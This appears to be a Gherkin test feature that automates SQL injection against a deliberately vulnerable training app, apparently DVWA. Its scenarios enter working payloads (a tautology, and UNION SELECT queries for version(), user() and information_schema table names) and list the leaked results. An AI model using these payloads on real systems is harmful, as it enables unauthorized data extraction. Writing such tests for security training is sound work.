Feature: SQL injection Execution
  SQL injection vulnerability

  Scenario: Attacker perform simple SQL injection and gain access to the users list
    Given user login the application with 'admin' and 'password'
    And go to 'vulnerabilities/sqli/' page
    When user enters "%' or '0'='0" and clicks 'Submit'
    Then user gains access to the following list of users
        | admin | admin |
        | Gordon | Brown |
        | Hack | Me |
        | Pablo | Picasso |
        | Bob | Smith |

  Scenario: Attacker perform SQL injection and gain access to the database version
    Given user login the application with 'admin' and 'password'
    And go to 'vulnerabilities/sqli/' page
    When user enters "%' or 0=0 union select null, version() #" and clicks 'Submit'
    Then user see 5 users and database '10.1.26-MariaDB-0+deb9u1' version

  Scenario: Attacker perform SQL injection and gain access to the database user
    Given user login the application with 'admin' and 'password'
    And go to 'vulnerabilities/sqli/' page
    When user enters "%' or 0=0 union select null, user() #" and clicks 'Submit'
    Then user see 5 users and database user 'app@localhost'

  Scenario: Attacker perform SQL injection and gain access to all tables in information_schema
    Given user login the application with 'admin' and 'password'
    And go to 'vulnerabilities/sqli/' page
    When user enters "%' and 1=0 union select null, table_name from information_schema.tables #" and clicks 'Submit'
    Then user see the tables in information_schema
    | guestbook |
    | users |
    | ALL_PLUGINS |
    | APPLICABLE_ROLES |